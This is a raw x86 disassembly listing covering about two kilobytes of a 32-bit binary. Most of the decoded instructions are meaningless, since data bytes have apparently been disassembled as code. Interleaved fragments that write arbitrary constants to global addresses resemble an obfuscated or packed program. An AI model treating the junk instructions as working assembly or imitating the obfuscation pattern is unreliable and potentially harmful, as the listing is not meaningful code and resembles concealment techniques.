  40d656:	sbb    esi,DWORD PTR [ecx+0x3c0835e4]
  40d65c:	pushf  
  40d65d:	les    ebx,FWORD PTR [edx-0x1d3042a7]
  40d663:	push   edx
  40d664:	jo     0x40d666
  40d666:	rcl    BYTE PTR [esi],0xd0
  40d669:	fmul   DWORD PTR [ebx]
  40d66b:	fist   WORD PTR [edi-0x4471576a]
  40d671:	mov    ebp,0xfc47dfb4
  40d676:	ds dec esp
  40d678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d679:	mov    DWORD PTR [edx],eax
  40d67b:	dec    edx
  40d67c:	dec    esi
  40d67d:	daa    
  40d67e:	pop    ecx
  40d67f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d680:	pop    ebx
  40d681:	cwde   
  40d682:	jne    0x40d620
  40d684:	jp     0x40d60c
  40d686:	aaa    
  40d687:	push   es
  40d688:	fwait
  40d689:	ret    0xea66
  40d68c:	pop    DWORD PTR [esp+ebx*4+0x70b0012d]
  40d693:	sar    BYTE PTR [edi],0xd0
  40d696:	pop    ds
  40d697:	out    0x7f,eax
  40d699:	fisub  WORD PTR [edi]
  40d69b:	pop    ds
  40d69c:	not    DWORD PTR [eax+0xa]
  40d69f:	enter  0x78bd,0xa5
  40d6a3:	ret    0x8cf4
  40d6a6:	cmp    BYTE PTR [ecx],al
  40d6a8:	cmp    al,0x70
  40d6aa:	call   ecx
  40d6ac:	add    eax,0xb96d469
  40d6b1:	ss or  ah,bl
  40d6b4:	mov    ds,WORD PTR [edi+ebp*2-0x43f58c20]
  40d6bb:	push   ss
  40d6bc:	add    al,0x92
  40d6be:	and    eax,0x95c18248
  40d6c3:	inc    edi
  40d6c4:	jl     0x40d6aa
  40d6c6:	mov    eax,0xf84bf484
  40d6cb:	aad    0xf8
  40d6cd:	or     edi,DWORD PTR [edi+0x6a9ba5f]
  40d6d3:	stc    
  40d6d4:	dec    edx
  40d6d5:	and    DWORD PTR [edx+ebx*8-0x47],ebp
  40d6d9:	mov    dl,0x52
  40d6db:	aaa    
  40d6dc:	lea    ecx,[edx+ebx*4+0xb]
  40d6e0:	fsub   DWORD PTR [esi+edx*4]
  40d6e3:	popf   
  40d6e4:	and    BYTE PTR [ecx+0x1addf1f0],0x2f
  40d6eb:	(bad)  
  40d6ec:	nop
  40d6ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6ee:	jle    0x40d6be
  40d6f0:	mov    edx,0x91387ddd
  40d6f5:	jns    0x40d6fb
  40d6f7:	inc    esi
  40d6f8:	es cs push ebp
  40d6fb:	ds jb  0x40d717
  40d6fe:	fst    DWORD PTR [edi]
  40d700:	mov    ds:0xcf6baf03,eax
  40d705:	je     0x40d6c5
  40d707:	inc    esi
  40d708:	ss ret 0x74ed
  40d70c:	in     al,dx
  40d70d:	jnp    0x40d77d
  40d70f:	dec    ebp
  40d710:	inc    ebp
  40d711:	je     0x40d6cc
  40d713:	add    bl,0xc3
  40d716:	out    dx,eax
  40d717:	fisub  WORD PTR [ebp+0x47f0ce01]
  40d71d:	es mov bl,0x27
  40d720:	jb     0x40d721
  40d722:	xor    BYTE PTR [esi+0x33],dh
  40d725:	push   ebx
  40d726:	adc    DWORD PTR [ecx+0x79dba41],edx
  40d72c:	xchg   esi,eax
  40d72d:	or     esi,DWORD PTR [eax+0x2ef34324]
  40d733:	outs   dx,BYTE PTR ds:[esi]
  40d734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d735:	fwait
  40d736:	js     0x40d6e9
  40d738:	sub    eax,DWORD PTR ds:0xe8ee2b2f
  40d73e:	jo     0x40d6e5
  40d740:	push   ebp
  40d741:	aaa    
  40d742:	repz clc 
  40d744:	stos   DWORD PTR es:[edi],eax
  40d745:	sub    esp,edi
  40d747:	mov    ds:0xde9ca750,eax
  40d74c:	sub    eax,0x2630f35
  40d751:	jl     0x40d742
  40d753:	les    ebx,FWORD PTR [edi+edi*8-0x7b]
  40d757:	aad    0xfe
  40d759:	enter  0xac3c,0xf8
  40d75d:	bound  eax,QWORD PTR [ebp-0x10dd4ae3]
  40d763:	or     al,0xe2
  40d765:	mov    bh,0x34
  40d767:	stc    
  40d768:	push   edi
  40d769:	aaa    
  40d76a:	sar    DWORD PTR ds:[ecx],cl
  40d76d:	lods   eax,DWORD PTR ds:[esi]
  40d76e:	fisubr WORD PTR [ebp+0x61505425]
  40d774:	push   eax
  40d775:	push   esp
  40d776:	fwait
  40d777:	and    BYTE PTR [esi],dh
  40d779:	stos   DWORD PTR es:[edi],eax
  40d77a:	scas   al,BYTE PTR es:[edi]
  40d77b:	xchg   ebx,eax
  40d77c:	mov    dl,0xdd
  40d77e:	push   cs
  40d77f:	xlat   BYTE PTR ds:[ebx]
  40d780:	ins    DWORD PTR es:[edi],dx
  40d781:	xchg   ah,dh
  40d783:	clc    
  40d784:	pop    eax
  40d785:	mov    esp,0x1c7b7d98
  40d78a:	push   0x5e
  40d78c:	mov    edx,0xc407855a
  40d791:	pop    ds
  40d792:	push   0x7a
  40d794:	in     al,0x63
  40d796:	gs inc edx
  40d798:	js     0x40d7dd
  40d79a:	in     eax,dx
  40d79b:	pop    esp
  40d79c:	adc    esi,esi
  40d79e:	lea    ebp,[esi]
  40d7a0:	push   edx
  40d7a1:	shl    DWORD PTR [ebx],cl
  40d7a3:	cwde   
  40d7a4:	mov    eax,0x6de14a22
  40d7a9:	test   bh,0x32
  40d7ac:	dec    edx
  40d7ad:	mov    esi,0x5a52313a
  40d7b2:	mov    BYTE PTR [ebx],dh
  40d7b4:	mov    eax,ds:0x7bb5a6a0
  40d7b9:	or     ch,BYTE PTR [eax-0x16]
  40d7bc:	cmp    edi,0x33c
  40d7c2:	mov    DWORD PTR ds:0x42aa1d,0x14bd
  40d7cc:	jne    0x40dd11
  40d7d2:	and    eax,DWORD PTR ds:0x42aa25
  40d7d8:	jmp    0x40da30
  40d7dd:	int    0xca
  40d7df:	(bad)  
  40d7e0:	into   
  40d7e1:	(bad)  
  40d7e3:	aad    0xc9
  40d7e5:	lea    edi,[esi-0x3ece1ba3]
  40d7eb:	mov    ebx,0x78a95942
  40d7f0:	js     0x40d827
  40d7f2:	jle    0x40d86c
  40d7f4:	js     0x40d7df
  40d7f6:	jle    0x40d78d
  40d7f8:	aad    0x10
  40d7fa:	mov    DWORD PTR [ebp-0x43e91e64],eax
  40d800:	jecxz  0x40d87b
  40d802:	lock cmp eax,DWORD PTR [eax+0x71874ea9]
  40d809:	aaa    
  40d80a:	pop    esp
  40d80b:	pushf  
  40d80c:	sub    eax,0x1a5993ee
  40d811:	loopne 0x40d7b6
  40d813:	xchg   ebp,eax
  40d814:	in     eax,0xb7
  40d816:	mov    BYTE PTR [eax],al
  40d818:	in     eax,dx
  40d819:	inc    eax
  40d81a:	call   0x2b91:0x4e2e73a3
  40d821:	pop    ecx
  40d822:	cld    
  40d823:	and    eax,0xf7dcc0ba
  40d828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d829:	retf   0xbc7e
  40d82c:	ror    DWORD PTR [eax+edx*4-0x597a8100],1
  40d833:	lahf   
  40d834:	push   ds
  40d835:	push   ss
  40d836:	xor    edi,edi
  40d838:	sbb    al,0x75
  40d83a:	adc    eax,0x580b7170
  40d83f:	les    eax,FWORD PTR [esi-0x65]
  40d842:	adc    ebx,DWORD PTR [eax]
  40d844:	push   0x4b
  40d846:	jb     0x40d7e1
  40d848:	shl    bh,0x3b
  40d84b:	xchg   esi,eax
  40d84c:	inc    ebp
  40d84d:	mov    eax,ds:0x2f084ec0
  40d852:	inc    ecx
  40d853:	ret    
  40d854:	aas    
  40d855:	psadbw mm2,QWORD PTR ds:0x2da48c74
  40d85c:	out    dx,eax
  40d85d:	mov    bl,0x18
  40d85f:	in     al,dx
  40d860:	or     dl,dh
  40d862:	sar    DWORD PTR [edi+edi*2+0x52e73fd2],1
  40d869:	xor    eax,0x41e682
  40d86e:	sar    DWORD PTR [eax],0xa7
  40d871:	out    0x8b,al
  40d873:	in     eax,0x93
  40d875:	inc    eax
  40d876:	(bad)  
  40d877:	sub    dl,dh
  40d879:	xchg   edx,eax
  40d87a:	mov    ebp,0x5dba6d1a
  40d87f:	jmp    0x40d8bc
  40d881:	add    eax,0x98febeb7
  40d886:	push   es
  40d887:	jge    0x40d86c
  40d889:	inc    ecx
  40d88a:	mov    cl,bh
  40d88c:	lods   eax,DWORD PTR ds:[esi]
  40d88d:	mov    edi,0x722e8fab
  40d892:	jo     0x40d876
  40d894:	in     eax,0x77
  40d896:	push   ss
  40d897:	xor    DWORD PTR [ecx],edi
  40d899:	sub    edx,DWORD PTR [eax]
  40d89b:	push   edx
  40d89c:	mov    eax,0xbb81386e
  40d8a1:	int    0x6a
  40d8a3:	sub    bl,dl
  40d8a5:	data16 in al,dx
  40d8a7:	in     al,dx
  40d8a8:	or     BYTE PTR [edi+0x5a79a20f],al
  40d8ae:	sub    WORD PTR [ecx],ax
  40d8b1:	pop    esp
  40d8b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8b3:	retf   
  40d8b4:	sahf   
  40d8b5:	jmp    0x40d8ec
  40d8b7:	test   ch,dh
  40d8b9:	mov    edx,0x5c7b7fc3
  40d8be:	mov    dh,0x96
  40d8c0:	push   edi
  40d8c1:	sar    esp,1
  40d8c3:	sbb    eax,0x9a100c5f
  40d8c8:	in     eax,0x7a
  40d8ca:	xchg   ebp,eax
  40d8cb:	fcom   DWORD PTR ds:0x41cc1991
  40d8d1:	or     eax,0x6e3aa5de
  40d8d6:	mov    dh,0x8c
  40d8d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8da:	push   esp
  40d8db:	jo     0x40d929
  40d8dd:	xor    eax,0x70e3e4a2
  40d8e2:	scas   eax,DWORD PTR es:[edi]
  40d8e3:	retf   
  40d8e4:	adc    ah,bh
  40d8e6:	(bad)  
  40d8e7:	in     eax,0xf3
  40d8e9:	push   0xd531e9bb
  40d8ee:	push   edi
  40d8ef:	or     bl,al
  40d8f1:	cdq    
  40d8f2:	and    bl,ch
  40d8f4:	call   0x7507:0x2c71997f
  40d8fb:	leave  
  40d8fc:	mov    ss,WORD PTR [esi]
  40d8fe:	scas   eax,DWORD PTR es:[edi]
  40d8ff:	push   ds
  40d900:	sbb    WORD PTR [ebp+0x2bbc75a6],dx
  40d907:	xor    esi,esi
  40d909:	ss pop ss
  40d90b:	lods   eax,DWORD PTR ds:[esi]
  40d90c:	aad    0x14
  40d90e:	xchg   BYTE PTR [edi-0x16],dl
  40d911:	add    cl,BYTE PTR [ebp+eax*2+0x7d]
  40d915:	stos   DWORD PTR es:[edi],eax
  40d916:	stc    
  40d917:	jbe    0x40d8aa
  40d919:	add    edi,ebp
  40d91b:	or     al,0x51
  40d91d:	pop    eax
  40d91e:	ret    
  40d91f:	(bad)  
  40d920:	retf   0x8cc6
  40d923:	mov    dl,0xc0
  40d925:	mov    edx,0x55b6d959
  40d92a:	rol    BYTE PTR [esp+ebp*1],cl
  40d92d:	in     al,dx
  40d92e:	mov    dh,0x38
  40d930:	add    ebx,DWORD PTR [esi+eax*1]
  40d933:	xor    esi,eax
  40d935:	pop    edx
  40d936:	enter  0x1de6,0x32
  40d93a:	adc    ch,al
  40d93c:	pop    ds
  40d93d:	bound  ebp,QWORD PTR [ebp-0x18]
  40d940:	jmp    0x40d8dc
  40d942:	xor    al,0x7b
  40d944:	out    dx,al
  40d945:	scas   eax,DWORD PTR es:[edi]
  40d946:	cmova  edx,esp
  40d949:	jo     0x40d948
  40d94b:	add    al,BYTE PTR ds:0x8ea7f14d
  40d951:	dec    esi
  40d952:	(bad)  
  40d953:	or     al,0xed
  40d955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d956:	sub    BYTE PTR [ecx-0x2d],bl
  40d959:	xchg   ebx,ebx
  40d95b:	paddusb mm0,QWORD PTR [esi+0x1523aff5]
  40d962:	sbb    al,0x14
  40d964:	jae    0x40d980
  40d966:	sub    BYTE PTR [esi-0x30e9321d],bl
  40d96c:	pop    esp
  40d96d:	mov    eax,0x9c22f59c
  40d972:	push   esi
  40d973:	scas   eax,DWORD PTR es:[edi]
  40d974:	and    al,0x94
  40d976:	(bad)  [ebx-0x6f]
  40d979:	and    esp,DWORD PTR [esi+ebx*2-0x5e]
  40d97d:	cs icebp 
  40d97f:	or     dh,BYTE PTR [ecx]
  40d981:	(bad)  
  40d982:	mov    bh,0x62
  40d984:	and    DWORD PTR [ebp-0x57f94009],ebp
  40d98a:	jmp    0x7e8303a8
  40d98f:	leave  
  40d990:	sub    BYTE PTR [edi+eax*4-0x97302ae],0xb0
  40d998:	jl     0x40d95c
  40d99a:	xor    BYTE PTR [edi-0x2aaf7821],0x4d
  40d9a1:	sub    al,0xbe
  40d9a3:	retf   
  40d9a4:	and    esi,edx
  40d9a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9a7:	outs   dx,DWORD PTR ds:[esi]
  40d9a8:	add    eax,0x300889b3
  40d9ad:	arpl   si,dx
  40d9af:	cdq    
  40d9b0:	outs   dx,DWORD PTR ds:[esi]
  40d9b1:	jno    0x40d968
  40d9b3:	(bad)  
  40d9b4:	sub    BYTE PTR [ecx+ebx*1],dh
  40d9b7:	dec    esi
  40d9b8:	test   eax,0x6a8dc203
  40d9bd:	xchg   esi,eax
  40d9be:	fcos   
  40d9c0:	cmp    bl,BYTE PTR [esi]
  40d9c2:	xlat   BYTE PTR ds:[ebx]
  40d9c3:	je     0x40da1a
  40d9c5:	es cld 
  40d9c7:	das    
  40d9c8:	push   edx
  40d9c9:	pop    ds
  40d9ca:	dec    eax
  40d9cb:	push   0x47
  40d9cd:	jb     0x40da46
  40d9cf:	jmp    0x40d9d0
  40d9d1:	mov    cl,0xa
  40d9d3:	fs test eax,0x67edb535
  40d9d9:	shl    DWORD PTR [ebx],1
  40d9db:	add    dl,0xdf
  40d9de:	jns    0x40d989
  40d9e0:	mov    dh,0x4a
  40d9e2:	imul   edi,esp,0xfffffff5
  40d9e5:	mov    edi,0x5b86d770
  40d9ea:	sbb    edx,DWORD PTR [ecx+edi*2-0x468d06f0]
  40d9f1:	sub    cl,BYTE PTR [edi-0x12c6dce3]
  40d9f7:	push   ebx
  40d9f8:	imul   esi,edi,0x82c76ba7
  40d9fe:	inc    edx
  40d9ff:	ret    
  40da00:	loope  0x40da1d
  40da02:	pop    ebp
  40da03:	jmp    0x9a6a8869
  40da08:	mov    esp,0x15e2961c
  40da0d:	adc    esi,ebp
  40da0f:	cmp    eax,0x5e52e390
  40da14:	dec    ebx
  40da15:	rcl    DWORD PTR ds:0xedffa5e3,0x1d
  40da1c:	adc    DWORD PTR [ebp+0x45],eax
  40da1f:	iret   
  40da20:	jle    0x40d9fb
  40da22:	fiadd  WORD PTR [eax]
  40da24:	push   esi
  40da25:	dec    edi
  40da26:	test   al,0x1b
  40da29:	push   ebp
  40da2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da2b:	jns    0x40d9af
  40da2d:	push   ds
  40da2e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40da30:	and    DWORD PTR [ebp+0x8],0x0
  40da34:	mov    eax,ds:0x42aa91
  40da39:	sbb    eax,DWORD PTR ds:0x42aa69
  40da3f:	mov    ds:0x42aa91,eax
  40da44:	mov    eax,DWORD PTR [ebp-0x8]
  40da47:	xor    DWORD PTR ds:0x42aa51,0x42aa1d
  40da51:	sub    eax,DWORD PTR [ebp+0x8]
  40da54:	or     DWORD PTR ds:0x42aa61,0xc38
  40da5e:	push   eax
  40da5f:	adc    DWORD PTR ds:0x42a9d1,0x6147
  40da69:	mov    eax,DWORD PTR [ebp-0x4]
  40da6c:	jmp    0x40dcc4
  40da71:	enter  0xc6c0,0x3c
  40da75:	(bad)  
  40da76:	ret    0xd4da
  40da79:	push   cs
  40da7a:	in     al,dx
  40da7b:	pop    edi
  40da7c:	dec    esi
  40da7d:	test   BYTE PTR [ebx+0x3b],0x82
  40da81:	push   ss
  40da82:	scas   al,BYTE PTR es:[edi]
  40da83:	js     0x40dafd
  40da85:	xor    eax,0xba78787e
  40da8a:	leave  
  40da8b:	test   BYTE PTR [edi-0x7b468f0c],ch
  40da91:	push   bx
  40da93:	pop    es
  40da94:	cdq    
  40da95:	push   ds
  40da96:	and    DWORD PTR ds:0xa3a5f35d,esi
  40da9c:	xor    ecx,DWORD PTR ss:[edi+0x27]
  40daa0:	jns    0x40da95
  40daa2:	ja     0x40dae3
  40daa4:	scas   eax,DWORD PTR es:[edi]
  40daa5:	push   0x5a
  40daa7:	psubb  mm1,QWORD PTR [ecx+esi*8+0x37acd924]
  40daaf:	aas    
  40dab0:	jmp    DWORD PTR [ebp-0x3f9cd3ea]
  40dab6:	mov    al,ds:0x7ba0b2f6
  40dabb:	shl    DWORD PTR [edx-0x28],cl
  40dabe:	push   cs
  40dabf:	mov    edi,0x73329e6f
  40dac4:	pop    ebx
  40dac5:	mov    bl,0x4b
  40dac7:	ret    0x3468
  40daca:	adc    al,0x79
  40dacc:	pushf  
  40dacd:	les    ebx,FWORD PTR [ebx-0x66]
  40dad0:	imul   ebx,DWORD PTR [ecx],0x209d2d1c
  40dad6:	mov    al,0x41
  40dad8:	inc    eax
  40dad9:	push   ebp
  40dada:	sar    BYTE PTR [ebx],1
  40dadc:	inc    edx
  40dadd:	mov    esi,DWORD PTR [edi+0x36e1165d]
  40dae3:	add    esp,edi
  40dae5:	push   cs
  40dae6:	mov    ebp,0x437fa8bd
  40daeb:	aaa    
  40daec:	call   0xc6ae:0x2c084219
  40daf3:	inc    esi
  40daf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daf5:	lock mov al,0xe8
  40daf8:	pop    eax
  40daf9:	call   0x7b0:0x6c3b0745
  40db00:	aaa    
  40db01:	sub    eax,DWORD PTR [ecx]
  40db03:	fidiv  WORD PTR [ebp-0x7b6fe115]
  40db09:	jne    0x40db1d
  40db0b:	sahf   
  40db0c:	das    
  40db0d:	inc    DWORD PTR [eax+0x4f]
  40db10:	imul   edx,esp,0xfffffffa
  40db13:	push   eax
  40db14:	fnstsw WORD PTR cs:[ecx+0x283cb305]
  40db1b:	push   ecx
  40db1c:	mov    WORD PTR [ebx-0x6fb5d801],cs
  40db22:	stos   DWORD PTR es:[edi],eax
  40db23:	and    ah,ah
  40db25:	mov    al,ds:0x411bdf18
  40db2a:	xor    BYTE PTR [edx+ebp*4+0x4b7a64be],dl
  40db31:	fcom   QWORD PTR [bp+di]
  40db34:	jp     0x40db35
  40db36:	pop    edi
  40db37:	and    DWORD PTR [eax],edx
  40db39:	data16 fsubp st(1),st
  40db3c:	fs rcl bh,cl
  40db3f:	test   al,0xe8
  40db41:	cmp    edx,ebp
  40db43:	push   0x5
  40db45:	ficom  DWORD PTR [eax]
  40db47:	xchg   ebx,eax
  40db48:	sti    
  40db49:	mov    cs:0x8adbd48a,eax
  40db4f:	mov    esp,0x86c82dc4
  40db54:	mov    DWORD PTR [edi-0x3c689592],esp
  40db5a:	xlat   BYTE PTR ds:[ebx]
  40db5b:	and    BYTE PTR [ebp+0x10],dh
  40db5e:	and    ch,dh
  40db60:	iret   
  40db61:	jg     0x40db38
  40db63:	sar    DWORD PTR [ebp-0x19367182],1
  40db69:	cld    
  40db6a:	jmp    0x1080:0x10edc7a
  40db71:	outs   dx,BYTE PTR ds:[esi]
  40db72:	sbb    BYTE PTR [edi+eax*8],bl
  40db75:	mov    ds:0x80a0d99f,al
  40db7a:	dec    ebp
  40db7b:	dec    edx
  40db7c:	neg    BYTE PTR cs:[esi]
  40db7f:	mov    esp,0xc2992b64
  40db84:	mov    edi,fs
  40db86:	pop    es
  40db87:	mov    bl,bl
  40db89:	stos   BYTE PTR es:[edi],al
  40db8a:	addr16 inc esp
  40db8c:	mov    WORD PTR [eax],es
  40db8e:	mov    ecx,0xcf66e415
  40db93:	sti    
  40db94:	push   ds
  40db95:	xchg   DWORD PTR [eax],edx
  40db97:	aaa    
  40db98:	mov    dh,0x32
  40db9a:	xor    dl,BYTE PTR [ecx]
  40db9c:	ret    
  40db9d:	pop    ss
  40db9e:	repnz fdivr DWORD PTR [edi]
  40dba1:	xchg   DWORD PTR [ebp-0x45c0d07],edi
  40dba7:	sub    al,0xdf
  40dba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbaa:	push   cs
  40dbab:	outs   dx,BYTE PTR ds:[esi]
  40dbac:	inc    eax
  40dbad:	pop    ecx
  40dbae:	sbb    al,BYTE PTR [edx-0x5b]
  40dbb1:	mov    bh,0x9e
  40dbb3:	mov    al,0x61
  40dbb5:	push   esi
  40dbb6:	or     al,0x54
  40dbb8:	pop    es
  40dbb9:	addr16 enter 0xbbe,0xd4
  40dbbe:	cmp    eax,0x837bf554
  40dbc3:	(bad)
  40dbc6:	sbb    al,0x4e
  40dbc8:	push   0xffffffc6
  40dbca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbcb:	test   edx,esp
  40dbcd:	jecxz  0x40dc1a
  40dbcf:	lock and al,0x49
  40dbd2:	call   0xc106:0x4384b72f
  40dbd9:	jae    0x40dbae
  40dbdb:	cs cs bswap edi
  40dbdf:	jecxz  0x40dc49
  40dbe1:	inc    esi
  40dbe2:	addr16 push 0xfffffffa
  40dbe5:	dec    eax
  40dbe6:	or     BYTE PTR [esi-0x32f27212],bh
  40dbec:	sbb    esp,DWORD PTR [ebx+0x8]
  40dbef:	add    al,0xaf
  40dbf1:	mov    ds:0x5f2f42d7,eax
  40dbf6:	inc    esp
  40dbf7:	push   ss
  40dbf8:	(bad)  
  40dbf9:	pushf  
  40dbfa:	sbb    eax,0xa174c9e1
  40dbff:	je     0x40dc3d
  40dc01:	push   es
  40dc02:	sub    ah,BYTE PTR [edi]
  40dc04:	mov    WORD PTR [edx+0xc63e979],cs
  40dc0a:	mov    ?,WORD PTR [eax]
  40dc0c:	sti    
  40dc0d:	jl     0x40dc41
  40dc0f:	sub    BYTE PTR [edi+0x3a],0x78
  40dc13:	push   esi
  40dc14:	daa    
  40dc15:	ja     0x40dc1f
  40dc17:	ins    DWORD PTR es:[edi],dx
  40dc18:	or     al,0xee
  40dc1a:	dec    esp
  40dc1b:	adc    eax,DWORD PTR [edx-0xbb8ed72]
  40dc21:	dec    edx
  40dc22:	cmp    BYTE PTR [edi+0x6c032a0e],bh
  40dc28:	dec    eax
  40dc29:	retf   0x69a6
  40dc2c:	outs   dx,DWORD PTR ds:[esi]
  40dc2d:	fwait
  40dc2e:	or     al,0xd3
  40dc30:	sbb    BYTE PTR [edx-0x6d65ec54],0x33
  40dc37:	and    bl,0xa5
  40dc3a:	sub    DWORD PTR [ecx],0x2b416134
  40dc40:	aaa    
  40dc41:	inc    ecx
  40dc42:	outs   dx,DWORD PTR ds:[esi]
  40dc43:	pusha  
  40dc44:	arpl   WORD PTR [edx+0x23],ax
  40dc47:	xchg   edi,eax
  40dc48:	lods   eax,DWORD PTR ds:[esi]
  40dc49:	lahf   
  40dc4a:	pop    ss
  40dc4b:	inc    ebx
  40dc4c:	loope  0x40dcb8
  40dc4e:	call   0x102aea11
  40dc53:	mov    ecx,0x71882c05
  40dc58:	lock stos BYTE PTR es:[edi],al
  40dc5a:	pop    eax
  40dc5b:	cs dec edi
  40dc5d:	mov    ebx,0x3ea58968
  40dc62:	leave  
  40dc63:	or     ebx,edi
  40dc65:	out    0x1c,eax
  40dc67:	int3   
  40dc68:	mov    eax,DWORD PTR [eax+0x4]
  40dc6b:	and    BYTE PTR [ecx+0xa7083bd],dl
  40dc71:	call   0x28d9:0xec2ec02c
  40dc78:	lock outs dx,BYTE PTR ds:[esi]
  40dc7a:	lahf   
  40dc7b:	repz (bad)
  40dc7f:	pop    ebp
  40dc80:	mov    ds:0x10592851,eax
  40dc85:	gs mov al,cs:0x55360c29
  40dc8c:	pop    esi
  40dc8d:	cmp    al,0x47
  40dc8f:	clc    
  40dc90:	mov    dl,ah
  40dc92:	or     ch,BYTE PTR [ecx]
  40dc94:	popa   
  40dc95:	pop    esi
  40dc96:	lea    esp,[eax+0x5b]
  40dc99:	(bad)  
  40dc9a:	pop    esp
  40dc9b:	lods   eax,DWORD PTR ds:[esi]
  40dc9c:	clc    
  40dc9d:	mov    al,ds:0x8688e010
  40dca2:	repz arpl WORD PTR ss:[edi],ax
  40dca6:	lock sub DWORD PTR [esi+0x26],edi
  40dcaa:	call   0x5ebf:0xf528f825
  40dcb1:	stos   BYTE PTR es:[edi],al
  40dcb2:	sbb    edx,DWORD PTR [ecx]
  40dcb4:	in     al,0xcc
  40dcb6:	cmp    cl,BYTE PTR [esi+0x4d]
  40dcb9:	cmp    cl,dh
  40dcbb:	fisubr DWORD PTR ds:0xddf30064
  40dcc1:	xchg   esi,eax
  40dcc2:	scas   eax,DWORD PTR es:[edi]
  40dcc3:	enter  0x4503,0x8
  40dcc7:	add    DWORD PTR ds:0x42aae1,0x296a
  40dcd1:	push   eax
  40dcd2:	adc    DWORD PTR ds:0x42a9bd,0x7658
  40dcdc:	call   0x40e99f
  40dce1:	mov    DWORD PTR ds:0x42aa15,0x7bae
  40dceb:	inc    DWORD PTR [ebp+0x8]
  40dcee:	cmp    DWORD PTR [ebp+0x8],0x52
  40dcf2:	mov    DWORD PTR ds:0x42aa91,0x71fa
  40dcfc:	jb     0x40da34
  40dd02:	mov    DWORD PTR ds:0x42aa9d,0x568b
  40dd0c:	jmp    0x40e979
  40dd11:	cmp    edi,0x1a2
  40dd17:	jne    0x40e497
  40dd1d:	sbb    DWORD PTR ds:0x42aa19,edx
  40dd23:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  40dd2a:	mov    eax,DWORD PTR [ebp-0x4]
  40dd2d:	mov    DWORD PTR [ebp-0x5c],eax
  40dd30:	mov    eax,DWORD PTR [ebp-0x8]
  40dd33:	mov    DWORD PTR [ebp-0x58],eax
  40dd36:	movzx  eax,WORD PTR ds:0x42aa11
  40dd3d:	and    DWORD PTR ds:0x42a9e1,eax
  40dd43:	mov    eax,DWORD PTR [ebp-0xc]
  40dd46:	adc    DWORD PTR ds:0x42aad1,0x42aadd
  40dd50:	xor    eax,esi
  40dd52:	jmp    0x40dfaa
  40dd57:	rol    eax,0x3e
  40dd5a:	leave  
  40dd5b:	leave  
  40dd5c:	leave  
  40dd5d:	leave  
  40dd5e:	rcr    BYTE PTR [ebx+0x66],0x3b
  40dd62:	inc    esi
  40dd63:	pop    es
  40dd64:	push   esi
  40dd65:	fisttp DWORD PTR [ebx]
  40dd67:	shr    DWORD PTR [eax+edi*2+0x787e3578],cl
  40dd6e:	js     0x40dd1b
  40dd70:	jmp    0x939bde1e
  40dd75:	dec    eax
  40dd76:	in     eax,0xb3
  40dd78:	popf   
  40dd79:	mov    DWORD PTR [edi-0x8],0xbceba224
  40dd80:	inc    eax
  40dd81:	cmc    
  40dd82:	mov    ebp,0x726e14a5
  40dd87:	and    ch,BYTE PTR [ebx+0x15]
  40dd8a:	sub    ebx,edi
  40dd8c:	or     al,cl
  40dd8e:	or     BYTE PTR ds:0x5e307cc7,ch
  40dd94:	jae    0x40dde7
  40dd96:	in     eax,0x97
  40dd98:	int    0x64
  40dd9a:	xchg   ebx,eax
  40dd9b:	jmp    0xb2a13f3a
  40dda0:	dec    ebp
  40dda1:	(bad)  
  40dda2:	pop    esp
  40dda3:	add    bh,BYTE PTR [ebp-0x2dd17e1b]
  40dda9:	aas    
  40ddaa:	les    eax,FWORD PTR [edi]
  40ddac:	shr    DWORD PTR [esp+ecx*4-0x22],1
  40ddb0:	xchg   ebx,eax
  40ddb1:	int3   
  40ddb2:	mov    DWORD PTR [ecx+0x15],esp
  40ddb5:	dec    esp
  40ddb6:	cmp    eax,esi
  40ddb8:	mov    WORD PTR [edx-0x45],cs
  40ddbb:	sar    BYTE PTR [ecx+0x7fb9cbb],0x1
  40ddc2:	arpl   WORD PTR [esi],di
  40ddc4:	imul   edx,DWORD PTR [ebx-0x5c3a2f5e],0x6a18e660
  40ddce:	xchg   esi,edi
  40ddd0:	inc    ebp
  40ddd1:	not    DWORD PTR [ebp+0xb7a3887]
  40ddd7:	mov    al,ds:0xe54d8016
  40dddc:	xor    ecx,eax
  40ddde:	imul   ebp,DWORD PTR gs:[ebx+0x0],0x24
  40dde3:	cdq    
  40dde4:	scas   al,BYTE PTR es:[edi]
  40dde5:	push   eax
  40dde6:	and    eax,0x691fa307
  40ddeb:	lods   eax,DWORD PTR ds:[esi]
  40ddec:	outs   dx,BYTE PTR ds:[esi]
  40dded:	jae    0x40de2a
  40ddef:	mov    esi,DWORD PTR [eax+0x4ca452c1]
  40ddf5:	mov    DWORD PTR [ebx],edx
  40ddf7:	xor    edi,DWORD PTR [edi+ecx*2-0x75]
  40ddfb:	mov    DWORD PTR [eax-0x54aed6a3],edi
  40de01:	jg     0x40de5d
  40de03:	fwait
  40de04:	sbb    al,0x91
  40de06:	and    ah,BYTE PTR [esi+0x6f]
  40de09:	nop
  40de0a:	retf   
  40de0b:	xchg   esi,eax
  40de0c:	adc    eax,0x1f1a3861
  40de11:	xor    eax,0x62816fb4
  40de16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de17:	dec    esp
  40de18:	callw  0x527e
  40de1c:	outs   dx,BYTE PTR ds:[esi]
  40de1d:	xchg   ecx,eax
  40de1e:	test   eax,0x2a834253
  40de23:	pop    edx
  40de24:	call   0xe75:0x61f93b97
  40de2b:	neg    BYTE PTR fs:[edx+eiz*8-0x2f]
  40de30:	jne    0x40de53
